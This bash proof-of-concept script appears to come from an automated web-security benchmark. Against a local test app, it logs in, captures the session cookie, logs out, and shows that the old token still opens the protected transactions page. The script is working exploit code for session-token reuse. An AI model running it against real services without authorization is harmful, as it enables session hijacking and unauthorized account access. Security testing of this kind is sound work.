#!/bin/bash
# POC: Demonstrates session token reuse vulnerability after logout. Captures session token from login, verifies access, logs out, and confirms the old session token still grants access to protected resources.
# Target: ./repo
# Created: 2025-12-01T15:59:29.203Z
# Session: benchmark-XBEN-093-24-minbvw4l

# Session Token Reuse After Logout - POC
# Demonstrates that session tokens remain valid after logout
# allowing unauthorized access to protected resources

TARGET_URL="${1:-http://localhost:5003}"
USERNAME="${2:-user}"
PASSWORD="${3:-user}"

echo "[*] Testing Session Token Reuse After Logout Vulnerability"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Authenticate and capture session token
echo "[STEP 1] Authenticating with credentials..."
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -d "username=$USERNAME&password=$PASSWORD" \
  "$TARGET_URL/login")

# Extract session token from cookies
SESSION_TOKEN=$(grep -oP 'session\s+\K[^ ]+' /tmp/cookies.txt 2>/dev/null || grep 'session' /tmp/cookies.txt | awk '{print $NF}')

if [ -z "$SESSION_TOKEN" ]; then
    # Try alternative method - check response headers
    SESSION_TOKEN=$(curl -s -i -d "username=$USERNAME&password=$PASSWORD" \
      "$TARGET_URL/login" | grep -i 'set-cookie.*session' | sed 's/.*session=\([^;]*\).*/\1/')
fi

echo "[+] Session token captured: ${SESSION_TOKEN:0:20}..."
echo ""

# Step 2: Verify session works before logout
echo "[STEP 2] Verifying session access BEFORE logout..."
BEFORE_LOGOUT=$(curl -s -w "\n%{http_code}" -H "Cookie: session=$SESSION_TOKEN" \
  "$TARGET_URL/transactions")
HTTP_CODE_BEFORE=$(echo "$BEFORE_LOGOUT" | tail -n1)
CONTENT_BEFORE=$(echo "$BEFORE_LOGOUT" | head -n-1)

echo "[+] HTTP Status Code BEFORE logout: $HTTP_CODE_BEFORE"
if echo "$CONTENT_BEFORE" | grep -q "transaction\|Transaction"; then
    echo "[+] Protected content accessible before logout ✓"
else
    echo "[-] Could not access protected content before logout"
fi
echo ""

# Step 3: Logout with the session cookie
echo "[STEP 3] Sending logout request..."
LOGOUT_RESPONSE=$(curl -s -w "\n%{http_code}" -H "Cookie: session=$SESSION_TOKEN" \
  "$TARGET_URL/logout")
HTTP_CODE_LOGOUT=$(echo "$LOGOUT_RESPONSE" | tail -n1)

echo "[+] Logout response code: $HTTP_CODE_LOGOUT"
echo "[+] Session invalidation attempt completed"
echo ""

# Step 4: Attempt to reuse the old session token
echo "[STEP 4] Attempting to reuse session token AFTER logout..."
sleep 1

AFTER_LOGOUT=$(curl -s -w "\n%{http_code}" -H "Cookie: session=$SESSION_TOKEN" \
  "$TARGET_URL/transactions")
HTTP_CODE_AFTER=$(echo "$AFTER_LOGOUT" | tail -n1)
CONTENT_AFTER=$(echo "$AFTER_LOGOUT" | head -n-1)

echo "[+] HTTP Status Code AFTER logout: $HTTP_CODE_AFTER"

# Check for vulnerability
echo ""
echo "[*] VULNERABILITY ASSESSMENT:"
echo "================================"

if [ "$HTTP_CODE_BEFORE" = "200" ] && [ "$HTTP_CODE_AFTER" = "200" ]; then
    echo "[!] VULNERABILITY CONFIRMED!"
    echo "[!] Session token is still valid after logout"
    echo "[!] Attacker can continue accessing protected resources"
    echo ""
    echo "[!] Before logout: HTTP $HTTP_CODE_BEFORE - Session valid"
    echo "[!] After logout:  HTTP $HTTP_CODE_AFTER - Session STILL valid"
    echo ""
    
    # Check if content is the same (more definitive proof)
    if [ "$(echo "$CONTENT_BEFORE" | wc -c)" -eq "$(echo "$CONTENT_AFTER" | wc -c)" ]; then
        echo "[!] Content length identical - Same protected resource returned"
    fi
    
    exit 0  # Vulnerability confirmed
else
    echo "[-] Could not confirm vulnerability"
    echo "[-] Before logout: HTTP $HTTP_CODE_BEFORE"
    echo "[-] After logout: HTTP $HTTP_CODE_AFTER"
    exit 1
fi